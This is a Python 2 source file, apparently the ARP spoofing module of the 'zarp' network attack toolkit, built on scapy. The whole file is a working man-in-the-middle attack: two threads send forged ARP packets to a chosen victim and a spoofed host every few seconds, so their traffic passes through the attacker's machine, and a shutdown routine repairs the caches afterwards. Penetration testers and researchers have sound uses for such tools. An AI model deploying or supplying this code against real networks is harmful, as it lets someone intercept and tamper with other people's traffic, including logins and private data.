import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from threading import Thread
from scapy.all import *
from util import Error, Msg, debug
from poison import Poison
from zoption import Zoption
import config


class arp(Poison):
    """ARP spoofing class
    """

    def __init__(self):
        super(arp, self).__init__('ARP Spoof')
        conf.verb = 0
        # tuples (ip,mac)
        self.local  = (config.get('ip_addr'), get_if_hwaddr(config.get('iface')))
        self.victim = ()
        self.target = ()
        self.config.update({"to_ip":Zoption(value = None, 
                                            type = "ip",
                                            required = True,
                                            display = "Target to poison"),
                            "from_ip":Zoption(value = None,
                                            type = "ip",
                                            required = True,
                                     display = "Address to spoof from target"),
                            "respoof":Zoption(value = 2,
                                              type = "int",
                                              required = False,
                                display = "Interval to send respoofed packets")
                            })
        self.info = """
                    The heart and soul of zarp.  This module exploits the ARP
                    protocol to redirect all traffic through the attacker's 
                    chosen system. 

                    http://en.wikipedia.org/wiki/ARP_poison
                    """

    def initialize(self):
        """Initialize the ARP spoofer
        """
        self.victim = (self.config['to_ip'].value, 
                            getmacbyip(self.config['to_ip'].value))
        self.target = (self.config['from_ip'].value,
                            getmacbyip(self.config['from_ip'].value))
        Msg("Initializing ARP poison...")
        return self.initialize_post_spoof()

    def initialize_post_spoof(self):
        """ Separated from mainline initialization so we can run this post-var
            configuration.  If you're calling this, BE SURE to set up the required
            variables first!
        """
        try:
            # send ARP replies to victim
            debug('Beginning ARP spoof to victim...')
            self.running = True
            victim_thread = Thread(target=self.respoofer,
                                        args=(self.target, self.victim))
            victim_thread.start()
            # send ARP replies to spoofed address
            target_thread = Thread(target=self.respoofer,
                                        args=(self.victim, self.target))
            target_thread.start()
        except KeyboardInterrupt:
            Msg('Closing ARP poison down...')
            self.running = False
            return None
        except TypeError, t:
            Error('Type error: %s' % t)
            self.running = False
            return None
        except Exception, j:
            Error('Error with ARP poisoner: %s' % j)
            self.running = False
            return None
        return self.victim[0]

    def respoofer(self, target, victim):
        """ Respoof the target every two seconds.
        """
        try:
            pkt = Ether(dst=target[1], src=self.local[1])
            pkt /= ARP(op="who-has", psrc=victim[0], pdst=target[0])
            while self.running:
                sendp(pkt, iface_hint=target[0])
                time.sleep(self.config['respoof'].value)
        except Exception, j:
            Error('Spoofer error: %s' % j)
            return None

    def shutdown(self):
        """ Shutdown the ARP spoofer
        """
        if not self.running:
            return
        Msg("Initiating ARP shutdown...")
        debug('initiating ARP shutdown')
        self.running = False
        time.sleep(2)  # give it a sec for the respoofer
        # rectify the ARP caches
        sendp(Ether(dst=self.victim[1], src=self.target[1]) / ARP(op='who-has',
                                psrc=self.target[0], pdst=self.victim[0]),
                             count=1)
        sendp(Ether(dst=self.target[1], src=self.victim[1]) / ARP(op='who-has',
                                psrc=self.victim[0], pdst=self.target[0]),
                             count=1)
        debug('ARP shutdown complete.')
        return True

    def session_view(self):
        """ Return the IP we're poisoning
        """
        return self.victim[0]

    def view(self):
        """ ARP poisoner doesnt have a view, yet.
        """
        Msg('No view for ARP poison.  Enable a sniffer for detailed analysis.')
        return
